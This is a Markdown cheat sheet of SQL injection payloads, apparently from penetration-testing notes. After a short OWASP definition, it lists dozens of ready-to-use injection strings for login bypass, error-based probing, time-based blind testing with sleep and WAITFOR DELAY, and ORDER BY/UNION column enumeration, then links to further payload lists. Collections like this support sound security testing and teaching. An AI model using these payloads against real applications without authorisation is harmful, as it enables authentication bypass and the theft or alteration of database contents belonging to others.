# SQL Injection
> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

> 👍 **Tip:** for more payloads [github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)

## Generic SQL Injection Payloads

```sql
' or ' 
```
```sql
-- or #  
```
```sql
' OR '1 
```
```sql
' OR 1 -- - 
```
```sql
OR "" = " 
```
```sql
" OR 1 = 1 -- -" 
```
```sql
' OR '' = ' 
```
```sql
'=' 
```
```sql
'LIKE' 
```
```sql
'=0--+ 
```
```sql
OR 1=1 
```
```sql
' OR 'x'='x 
```
```sql
' AND id IS NULL; -- 
```
```sql
'''''''''''''UNION SELECT '2
```

## Time-Based
```sql
,(select * from (select(sleep(10)))a)
```
```sql
%2c(select%20*%20from%20(select(sleep(10)))a)
```
```sql
';WAITFOR DELAY '0:0:30'--
```

## Generic Error Based Payloads

```sql
OR 1=1
```
```sql
OR 1=1#
```
```sql
OR x=y#
```
```sql
OR 1=1-- 
```
```sql
OR x=x-- 
```
```sql
OR 3409=3409 AND ('pytW' LIKE 'pytW
```
```sql
HAVING 1=1
```
```sql
HAVING 1=1#
```
```sql
HAVING 1=0-- 
```
```sql
AND 1=1-- 
```
```sql
AND 1=1 AND '%'='
```
```sql
WHERE 1=1 AND 1=0--
```
```sql
%' AND 8310=8310 AND '%'='
```

## Authentication Based Payloads

```sql
' or 1=1 --
```
```sql
' or ''-'
```
```sql
' or '' '
```
```sql
' or ''&'
```
```sql
' or ''^'
```
```sql
' or ''*'
```
```sql
or true--
```
```sql
" or true--
```
```sql
' or true--
```
```sql
") or true--
```
```sql
') or true--
```
```sql
admin') or ('1'='1'--
```
```sql
admin') or ('1'='1'#
```
```sql
admin') or ('1'='1'/
```

## Order by and UNION Based Payloads
```sql
1' ORDER BY 1--+
```
```sql
1' ORDER BY 2--+
```
```sql
1' ORDER BY 3--+
```
```sql
1' ORDER BY 1,2--+
```
```sql
1' ORDER BY 1,2,3--+
```
```sql
1' GROUP BY 1,2,--+
```
```sql
1' GROUP BY 1,2,3--+
```
```sql
' GROUP BY columnnames having 1=1 --
```
```sql
-1' UNION SELECT 1,2,3--+
```
```sql
' UNION SELECT sum(columnname ) from tablename --
```
```sql
-1 UNION SELECT 1 INTO @,@
```
```sql
-1 UNION SELECT 1 INTO @,@,@
```
```sql
1 AND (SELECT * FROM Users) = 1 
```
```sql
' AND MID(VERSION(),1,1) = '5';
```



## 📚 References

* [owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [www.owasp.org/index.php/SQL_Injection_Bypassing_WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
* [portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
* [www.acunetix.com/websitesecurity/sql-injection/](https://www.acunetix.com/websitesecurity/sql-injection/)
* [github.com/LasCC/Hack-Tools](https://github.com/LasCC/Hack-Tools)
* [github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)